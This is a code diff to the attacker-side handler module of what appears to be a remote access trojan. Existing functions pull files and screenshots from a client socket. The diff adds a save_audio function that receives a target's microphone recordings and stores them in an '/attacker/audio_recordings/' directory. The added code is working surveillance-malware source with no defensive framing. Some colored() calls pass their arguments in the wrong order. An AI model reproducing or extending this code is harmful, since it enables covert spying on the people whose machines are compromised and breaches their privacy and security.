@@ -1,6 +1,7 @@
 from socket_handlers import socket_recv, socket_send
 from termcolor import colored
 import os, ast, base64, binascii
+from datetime import datetime
 
 
 def handle_download(client_socket, command) -> bool:
@@ -273,4 +274,39 @@ def handle_screenshot(client_socket, save_path="screenshot.png"):
     except Exception as e:
         error_msg = f"[!] Error: Unexpected error during screenshot handling - {str(e)}"
         print(colored(error_msg, "red"))
+        return False
+
+
+def save_audio(socket, save_dir="/attacker/audio_recordings/"):
+    try:
+        # Create directory if it doesn't exist
+        os.makedirs(save_dir, exist_ok=True)
+        
+        # Generate unique filename with timestamp
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"recording_{timestamp}.wav"
+        filepath = os.path.join(save_dir, filename)
+        
+        # Receive audio data using your socket_recv function
+        audio_data = socket_recv(socket)
+        
+        if not audio_data:
+            print(colored("red", "[!] Error: No audio data received"))
+            return False
+            
+        # Validate it's WAV data (basic check)
+        if len(audio_data) < 44 or not audio_data.startswith(b'RIFF'):
+            print(colored("red", "[!] Error: Invalid WAV file data received"))
+            return False
+            
+        # Save to permanent storage
+        with open(filepath, 'wb') as fp:
+            fp.write(audio_data)
+            fp.close()
+
+        print(colored("green", f"[+] Audio successfully saved to: {filepath}"))
+        return filepath
+        
+    except Exception as e:
+        print(colored("red", f"[!] Error saving audio: {str(e)}"))
         return False
